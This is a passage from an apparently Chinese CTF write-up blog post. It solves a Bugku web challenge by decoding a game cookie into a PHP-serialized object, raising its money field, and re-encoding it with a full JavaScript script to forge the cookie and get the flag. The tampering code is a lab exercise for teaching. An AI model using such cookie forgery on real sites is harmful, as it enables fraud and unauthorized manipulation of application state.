&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    key = key.replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">&#x27;&lt;img id=&quot;attack-1&quot; src=&quot;image/1-1.jpg&quot;&gt;&#x27;</span>);</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">document</span>.getElementById(<span class="string">&quot;attack-1&quot;</span>).src = <span class="string">&quot;image/1-2.jpg&quot;</span></span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">document</span>.getElementById(<span class="string">&quot;attack-1&quot;</span>).src = <span class="string">&quot;image/1-3.jpg&quot;</span></span><br><span class="line">    &#125;, <span class="number">2000</span>);</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">document</span>.getElementById(<span class="string">&quot;attack-1&quot;</span>).src = <span class="string">&quot;image/1-4.jpg&quot;</span></span><br><span class="line">    &#125;, <span class="number">3000</span>);</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">document</span>.getElementById(<span class="string">&quot;attack-1&quot;</span>).src = <span class="string">&quot;image/6.png&quot;</span></span><br><span class="line">    &#125;, <span class="number">4000</span>);</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        alert(<span class="string">&quot;浣犱娇鐢ㄥ鏉ョ鎺屾墦璐ヤ簡钂欒€侀瓟锛屼絾涓嶇煡閬撴槸鐪熻韩杩樻槸鍋囪韩锛屾彁浜よ瘯涓€涓嬪惂!flag&#123;&quot;</span> + md5(key) + <span class="string">&quot;&#125;&quot;</span>)    <span class="comment">//发现了flag字段  </span></span><br><span class="line">    &#125;, <span class="number">5000</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先在控制台中获取cookie</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getCookie(<span class="string">&quot;user&quot;</span>)<span class="comment">;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="https://i.loli.net/2020/11/25/YAdm9g1Z8R7MXIk.png" alt></p>
<p>获取cookie，使用上面的js代码一步一步解码</p>
<p>最后会获取序列化后的一串字符串</p>
<p><img src="https://i.loli.net/2020/11/25/ceNDwnU2LAVkv5Z.png" alt="mt-5.png"></p>
<p>最后解出来的cookie值</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">5</span>:<span class="string">&quot;human&quot;</span>:<span class="number">10</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;xueliang&quot;</span>;<span class="selector-tag">i</span>:<span class="number">615</span>;s:<span class="number">5</span>:<span class="string">&quot;neili&quot;</span>;<span class="selector-tag">i</span>:<span class="number">657</span>;s:<span class="number">5</span>:<span class="string">&quot;lidao&quot;</span>;<span class="selector-tag">i</span>:<span class="number">76</span>;s:<span class="number">6</span>:<span class="string">&quot;dingli&quot;</span>;<span class="selector-tag">i</span>:<span class="number">72</span>;s:<span class="number">7</span>:<span class="string">&quot;waigong&quot;</span>;<span class="selector-tag">i</span>:<span class="number">0</span>;s:<span class="number">7</span>:<span class="string">&quot;neigong&quot;</span>;<span class="selector-tag">i</span>:<span class="number">0</span>;s:<span class="number">7</span>:<span class="string">&quot;jingyan&quot;</span>;<span class="selector-tag">i</span>:<span class="number">0</span>;s:<span class="number">6</span>:<span class="string">&quot;yelian&quot;</span>;<span class="selector-tag">i</span>:<span class="number">0</span>;s:<span class="number">5</span>:<span class="string">&quot;money&quot;</span>;<span class="selector-tag">i</span>:<span class="number">0</span>;s:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;0&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>但是会发现money的值为0，所以下面的思路就是通过修改cookie中money值之后反编码成题目中的格式，抓包修改cookie后买技能打怪拿到flag</p>
<p>改cookie的方法就是将明文逆向编码：</p>
<p>刚开始写了挺久的逆向解密，发现调用base64中的encode时，怎么也解不出原来的加密代码，encode怎么也加密不出原来的cookie。<br>猜想一定是base64.js有问题：</p>
<p>发现加密过程并不对应，encode调用了_utf8_encode<br>但decode并没有调用_utf8_encode，所以需要对编码过程进行相应的修改</p>
<p><img src="https://i.loli.net/2020/11/25/GWgjr69lpYb74cT.png" alt="mt-7.png"></p>
<p><strong>修改后的反编码过程</strong>，将其放到html文件中，浏览器运行即可出结果</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line">//1.html</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">Base64</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"> </span><br><span class="line"><span class="javascript">	<span class="comment">// private property</span></span></span><br><span class="line"><span class="javascript">	_keyStr = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span>;</span></span><br><span class="line"> </span><br><span class="line"><span class="javascript">	<span class="comment">// public method for encoding</span></span></span><br><span class="line"><span class="javascript">	<span class="built_in">this</span>.encode = <span class="function"><span class="keyword">function</span> (<span class="params">input</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">		<span class="keyword">var</span> output = <span class="string">&quot;&quot;</span>;</span></span><br><span class="line"><span class="javascript">		<span class="keyword">var</span> chr1, chr2, chr3, enc1, enc2, enc3, enc4;</span></span><br><span class="line"><span class="javascript">		<span class="keyword">var</span> i = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">		<span class="comment">//input = _utf8_encode(input); (注释掉这个函数调用)</span></span></span><br><span class="line"><span class="javascript">		<span class="keyword">while</span> (i &lt; input.length) &#123;</span></span><br><span class="line">			chr1 = input.charCodeAt(i++);</span><br><span class="line">			chr2 = input.charCodeAt(i++);</span><br><span class="line">			chr3 = input.charCodeAt(i++);</span><br><span class="line">			enc1 = chr1 &gt;&gt; 2;</span><br><span class="line">			enc2 = ((chr1 &amp; 3) &lt;&lt; 4) | (chr2 &gt;&gt; 4);</span><br><span class="line">			enc3 = ((chr2 &amp; 15) &lt;&lt; 2) | (chr3 &gt;&gt; 6);</span><br><span class="line">			enc4 = chr3 &amp; 63;</span><br><span class="line"><span class="javascript">			<span class="keyword">if</span> (<span class="built_in">isNaN</span>(chr2)) &#123;</span></span><br><span class="line">				enc3 = enc4 = 64;</span><br><span class="line"><span class="javascript">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">isNaN</span>(chr3)) &#123;</span></span><br><span class="line">				enc4 = 64;</span><br><span class="line">			&#125;</span><br><span class="line">			output = output +</span><br><span class="line">			_keyStr.charAt(enc1) + _keyStr.charAt(enc2) +</span><br><span class="line">			_keyStr.charAt(enc3) + _keyStr.charAt(enc4);</span><br><span class="line">		&#125;</span><br><span class="line"><span class="javascript">		<span class="keyword">return</span> output;</span></span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line"><span class="javascript">	<span class="comment">// public method for decoding</span></span></span><br><span class="line"><span class="javascript">	<span class="built_in">this</span>.decode = <span class="function"><span class="keyword">function</span> (<span class="params">input</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">		<span class="keyword">var</span> output = <span class="string">&quot;&quot;</span>;</span></span><br><span class="line"><span class="javascript">		<span class="keyword">var</span> chr1, chr2, chr3;</span></span><br><span class="line"><span class="javascript">		<span class="keyword">var</span> enc1, enc2, enc3, enc4;</span></span><br><span class="line"><span class="javascript">		<span class="keyword">var</span> i = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">		input = input.replace(<span class="regexp">/[^A-Za-z0-9\+\/\=]/g</span>, <span class="string">&quot;&quot;</span>);</span></span><br><span class="line"><span class="javascript">		<span class="keyword">while</span> (i &lt; input.length) &#123;</span></span><br><span class="line">			enc1 = _keyStr.indexOf(input.charAt(i++));</span><br><span class="line">			enc2 = _keyStr.indexOf(input.charAt(i++));</span><br><span class="line">			enc3 = _keyStr.indexOf(input.charAt(i++));</span><br><span class="line">			enc4 = _keyStr.indexOf(input.charAt(i++));</span><br><span class="line">			chr1 = (enc1 &lt;&lt; 2) | (enc2 &gt;&gt; 4);</span><br><span class="line">			chr2 = ((enc2 &amp; 15) &lt;&lt; 4) | (enc3 &gt;&gt; 2);</span><br><span class="line">			chr3 = ((enc3 &amp; 3) &lt;&lt; 6) | enc4;</span><br><span class="line"><span class="javascript">			output = output + <span class="built_in">String</span>.fromCharCode(chr1);</span></span><br><span class="line">			if (enc3 != 64) &#123;</span><br><span class="line"><span class="javascript">				output = output + <span class="built_in">String</span>.fromCharCode(chr2);</span></span><br><span class="line">			&#125;</span><br><span class="line">			if (enc4 != 64) &#123;</span><br><span class="line"><span class="javascript">				output = output + <span class="built_in">String</span>.fromCharCode(chr3);</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="javascript">		<span class="comment">//output = _utf8_decode(output);</span></span></span><br><span class="line"><span class="javascript">		<span class="keyword">return</span> output;</span></span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line"><span class="javascript">	<span class="comment">// private method for UTF-8 encoding</span></span></span><br><span class="line"><span class="javascript">	_utf8_encode = <span class="function"><span class="keyword">function</span> (<span class="params">string</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">		string = string.replace(<span class="regexp">/\r\n/g</span>,<span class="string">&quot;\n&quot;</span>);</span></span><br><span class="line"><span class="javascript">		<span class="keyword">var</span> utftext = <span class="string">&quot;&quot;</span>;</span></span><br><span class="line"><span class="javascript">		<span class="keyword">for</span> (<span class="keyword">var</span> n = <span class="number">0</span>; n &lt; string.length; n++) &#123;</span></span><br><span class="line"><span class="javascript">			<span class="keyword">var</span> c = string.charCodeAt(n);</span></span><br><span class="line">			if (c &lt; 128) &#123;</span><br><span class="line"><span class="javascript">				utftext += <span class="built_in">String</span>.fromCharCode(c);</span></span><br><span class="line"><span class="javascript">			&#125; <span class="keyword">else</span> <span class="keyword">if</span>((c &gt; <span class="number">127</span>) &amp;&amp; (c &lt; <span class="number">2048</span>)) &#123;</span></span><br><span class="line"><span class="javascript">				utftext += <span class="built_in">String</span>.fromCharCode((c &gt;&gt; <span class="number">6</span>) | <span class="number">192</span>);</span></span><br><span class="line"><span class="javascript">				utftext += <span class="built_in">String</span>.fromCharCode((c &amp; <span class="number">63</span>) | <span class="number">128</span>);</span></span><br><span class="line"><span class="javascript">			&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">				utftext += <span class="built_in">String</span>.fromCharCode((c &gt;&gt; <span class="number">12</span>) | <span class="number">224</span>);</span></span><br><span class="line"><span class="javascript">				utftext += <span class="built_in">String</span>.fromCharCode(((c &gt;&gt; <span class="number">6</span>) &amp; <span class="number">63</span>) | <span class="number">128</span>);</span></span><br><span class="line"><span class="javascript">				utftext += <span class="built_in">String</span>.fromCharCode((c &amp; <span class="number">63</span>) | <span class="number">128</span>);</span></span><br><span class="line">			&#125;</span><br><span class="line"> </span><br><span class="line">		&#125;</span><br><span class="line"><span class="javascript">		<span class="keyword">return</span> utftext;</span></span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line"><span class="javascript">	<span class="comment">// private method for UTF-8 decoding</span></span></span><br><span class="line"><span class="javascript">	_utf8_decode = <span class="function"><span class="keyword">function</span> (<span class="params">utftext</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">		<span class="keyword">var</span> string = <span class="string">&quot;&quot;</span>;</span></span><br><span class="line"><span class="javascript">		<span class="keyword">var</span> i = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">		<span class="keyword">var</span> c = c1 = c2 = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">		<span class="keyword">while</span> ( i &lt; utftext.length ) &#123;</span></span><br><span class="line">			c = utftext.charCodeAt(i);</span><br><span class="line">			if (c &lt; 128) &#123;</span><br><span class="line"><span class="javascript">				string += <span class="built_in">String</span>.fromCharCode(c);</span></span><br><span class="line">				i++;</span><br><span class="line"><span class="javascript">			&#125; <span class="keyword">else</span> <span class="keyword">if</span>((c &gt; <span class="number">191</span>) &amp;&amp; (c &lt; <span class="number">224</span>)) &#123;</span></span><br><span class="line">				c2 = utftext.charCodeAt(i+1);</span><br><span class="line"><span class="javascript">				string += <span class="built_in">String</span>.fromCharCode(((c &amp; <span class="number">31</span>) &lt;&lt; <span class="number">6</span>) | (c2 &amp; <span class="number">63</span>));</span></span><br><span class="line">				i += 2;</span><br><span class="line"><span class="javascript">			&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line">				c2 = utftext.charCodeAt(i+1);</span><br><span class="line">				c3 = utftext.charCodeAt(i+2);</span><br><span class="line"><span class="javascript">				string += <span class="built_in">String</span>.fromCharCode(((c &amp; <span class="number">15</span>) &lt;&lt; <span class="number">12</span>) | ((c2 &amp; <span class="number">63</span>) &lt;&lt; <span class="number">6</span>) | (c3 &amp; <span class="number">63</span>));</span></span><br><span class="line">				i += 3;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="javascript">		<span class="keyword">return</span> string;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="comment">//原来cookie</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> temp = <span class="string">&quot;UTw7PCxqe3FjcC42OThOjWtSUFYwbm99amlzbG0wI3MeHBsUZ1liZxQMWEFDXl8EdUUOCgACd016B34WUlFWWTVoATEAAXF5P3Z2CmYgPTY5Pj90FSUUaGUfL2ZnYnYhCRMTGRQPQCcHKFIvEShXUlYCGQMbDQ4FXEcXREo/BTzBxKbu6fbrB+H+ps3nsLrP6dCs0LgR8fj1/+6y3+/apJ3XnJnkjNPf0NnRjpPD7pjzzfaMiJDcxt/XkP/B+I2C5vTqgUE=&quot;</span>;</span></span><br><span class="line"><span class="javascript"><span class="comment">//进行加密，获取明文</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> base = <span class="keyword">new</span> Base64();</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> result = base.decode(temp);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> result3 = <span class="string">&quot;&quot;</span>;</span></span><br><span class="line">for (i = 0; i &lt; result.length; i++) &#123;</span><br><span class="line"><span class="javascript">	<span class="keyword">var</span> num = result[i].charCodeAt();</span></span><br><span class="line">	num = num ^ i;</span><br><span class="line">	num = num - ((i % 10) + 2);</span><br><span class="line"><span class="javascript">	result3 += <span class="built_in">String</span>.fromCharCode(num);</span></span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.write(<span class="string">&quot;原明文：&quot;</span>+result3+<span class="string">&#x27;&lt;br/&gt;&#x27;</span>);</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.write(<span class="string">&#x27;&lt;br/&gt;&#x27;</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> result3 = <span class="string">&#x27;O:5:&quot;human&quot;:10:&#123;s:8:&quot;xueliang&quot;;i:830;s:5:&quot;neili&quot;;i:602;s:5:&quot;lidao&quot;;i:95;s:6:&quot;dingli&quot;;i:63;s:7:&quot;waigong&quot;;i:0;s:7:&quot;neigong&quot;;i:0;s:7:&quot;jingyan&quot;;i:0;s:6:&quot;yelian&quot;;i:0;s:5:&quot;money&quot;;i:200000;s:4:&quot;flag&quot;;s:1:&quot;0&quot;;&#125;&#x27;</span>;</span></span><br><span class="line"><span class="javascript"><span class="comment">//反编码获取cookie</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> result = <span class="string">&quot;&quot;</span>;</span></span><br><span class="line">for (i = 0;i&lt;result3.length;i++)&#123;</span><br><span class="line">	num = result3[i].charCodeAt();</span><br><span class="line">	num = num + ((i % 10) + 2);</span><br><span class="line">	num = num ^ i;</span><br><span class="line"><span class="javascript">	result += <span class="built_in">String</span>.fromCharCode(num);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="javascript"><span class="keyword">var</span> temp= base.encode(result);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="comment">//将cookie进行url编码</span></span></span><br><span class="line"><span class="javascript">temp = <span class="built_in">encodeURIComponent</span>(temp);</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.write(<span class="string">&quot;cookie:&quot;</span>+temp+<span class="string">&quot;&lt;/br&gt;&quot;</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>编码结果</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">UTw7PCxqe3FjcC42OThOjWtSUFYwbm99amlzbG0wI3MeHBsUZ1liZxQMWEFDXl8EdUUOCgACd016B34WUlFWWTVoATEAAXF5P3Z2CmYgPTY5Pj90FSUUaGUfL2ZnYnYhCRMTGRQPQCcHKFIvEShXUlYCGQMbDQ4FXEcXREo</span>%<span class="number">2</span>FBTzBxKbu<span class="number">6</span>fbrB%<span class="number">2</span>BH%<span class="number">2</span>Bps<span class="number">3</span>nsLrP<span class="number">6</span>dCs<span class="number">0</span>LgR<span class="number">8</span>fj<span class="number">1</span>%<span class="number">2</span>F%<span class="number">2</span>B<span class="number">6</span>y<span class="number">3</span>%<span class="number">2</span>B%<span class="number">2</span>FapJ<span class="number">3</span>XnJnkjNPf<span class="number">0</span>NnRjpPD<span class="number">7</span>paIiIiIhovBiIL<span class="number">4</span>kNTK<span class="number">0</span>dea%<span class="number">2</span>F<span class="number">7</span>mC%<span class="number">2</span>B<span class="number">4</span>bu%<span class="number">2</span>FOr<span class="number">1</span>SQ%<span class="number">3</span>D%<span class="number">3</span>D</span><br></pre></td></tr></table></figure>

<p>这就是我们期待的cookie,然后用工具修改cookie</p>
<p><img src="https://i.loli.net/2020/11/25/WMk48YRo5veBxXr.png" alt="nt-9.png"></p>
<p>修满属性值打怪拿到flag</p>
<p><img src="https://i.loli.net/2020/11/25/5Geyh8r7vBDOqKE.png" alt="mt-10.png"></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_41924764/article/details/109488408?utm_medium=distribute.pc_relevant.none-task-blog-title-2&spm=1001.2101.3001.4242">参考</a></p>
<p>这道题虽然很难，但是在一步一步尝试的过程中学到很多有用的东西，收获还是很大的，感谢师傅的wp，看了好久才做出了。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">sunzy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://sunzhengyu99.github.io/2020/09/10/bugku1/">https://sunzhengyu99.github.io/2020/09/10/bugku1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://sunzhengyu99.github.io" target="_blank">一路走到黑</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E8%84%9A%E6%9C%AC/">脚本</a><a class="post-meta__tags" href="/tags/php/">php</a><a class="post-meta__tags" href="/tags/cookie/">cookie</a><a class="post-meta__tags" href="/tags/%E7%BC%96%E7%A0%81/">编码</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/09/14/decode/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">bugku代码审计</div></div></a></div><div class="next-post pull-right"><a href="/2020/09/06/bugku1-10/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">bugku1-10</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2020/09/06/bugku1-10/" title="bugku1-10"><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-09-06</div><div class="title">bugku1-10</div></div></a></div><div><a href="/2020/09/02/nctf-2/" title="nctf-2"><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-09-02</div><div class="title">nctf-2</div></div></a></div><div><a href="/2020/09/03/综合2/" title="综合2"><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-09-03</div><div class="title">综合2</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/null" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">sunzy</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">41</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">51</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">12</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#bugku%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952"><span class="toc-number">1.</span> <span class="toc-text">bugku刷题记录2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB"><span class="toc-number">1.1.</span> <span class="toc-text">速度要快</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cookie%E6%AC%BA%E9%AA%97"><span class="toc-number">1.2.</span> <span class="toc-text">cookie欺骗</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#never-give-up"><span class="toc-number">1.3.</span> <span class="toc-text">never give up</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D"><span class="toc-number">1.4.</span> <span class="toc-text">过狗一句话</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E5%88%99%EF%BC%9F%E5%AD%97%E7%AC%A6%EF%BC%9F"><span class="toc-number">1.5.</span> <span class="toc-text">正则？字符？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E5%A5%B3%E5%8F%8B-SKCTF"><span class="toc-number">1.6.</span> <span class="toc-text">前女友(SKCTF)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#login1-SKCTF"><span class="toc-number">1.7.</span> <span class="toc-text">login1(SKCTF)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%A0%E4%BB%8E%E5%93%AA%E9%87%8C%E6%9D%A5"><span class="toc-number">1.8.</span> <span class="toc-text">你从哪里来</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#md5-collision"><span class="toc-number">1.9.</span> <span class="toc-text">md5 collision</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%91%98%E6%9C%AC%E5%9C%B0%E7%BD%91%E7%AB%99"><span class="toc-number">1.10.</span> <span class="toc-text">程序员本地网站</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87"><span class="toc-number">1.11.</span> <span class="toc-text">各种绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web8"><span class="toc-number">1.12.</span> <span class="toc-text">web8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%86%E5%BF%83"><span class="toc-number">1.13.</span> <span class="toc-text">细心</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%82getshell"><span class="toc-number">1.14.</span> <span class="toc-text">求getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#INSERT-INTO%E6%B3%A8%E5%85%A5"><span class="toc-number">1.15.</span> <span class="toc-text">INSERT INTO注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AA%E7%A5%9E%E5%A5%87%E7%9A%84%E7%99%BB%E9%99%86%E6%A1%86"><span class="toc-number">1.16.</span> <span 